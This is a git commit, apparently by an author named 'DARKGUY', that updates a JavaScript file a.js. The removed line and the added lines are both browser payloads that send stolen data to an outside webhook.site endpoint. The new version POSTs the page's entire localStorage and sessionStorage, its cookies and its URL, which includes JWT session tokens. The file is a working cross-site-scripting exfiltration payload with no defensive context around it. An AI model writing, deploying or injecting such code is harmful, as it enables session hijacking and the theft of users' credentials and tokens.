fb64928b63dd3db2acd0f0326483c49089f227a8
DARKGUY <richardlevip2021@icloud.com>
2025-11-04 09:58:42 +0700

    Update a.js

--- a.js
+++ a.js
@@ -1,1 +1,9 @@
-fetch('https://webhook.site/7591e2c7-2dd7-4650-8f1e-982701e9cc39?jwt='+localStorage.jwt+'&c='+document.cookie)
+fetch('https://webhook.site/7591e2c7-2dd7-4650-8f1e-982701e9cc39', {
+  method: 'POST',
+  body: JSON.stringify({
+    localStorage: JSON.stringify(localStorage),
+    sessionStorage: JSON.stringify(sessionStorage),
+    cookies: document.cookie,
+    url: location.href
+  })
+});
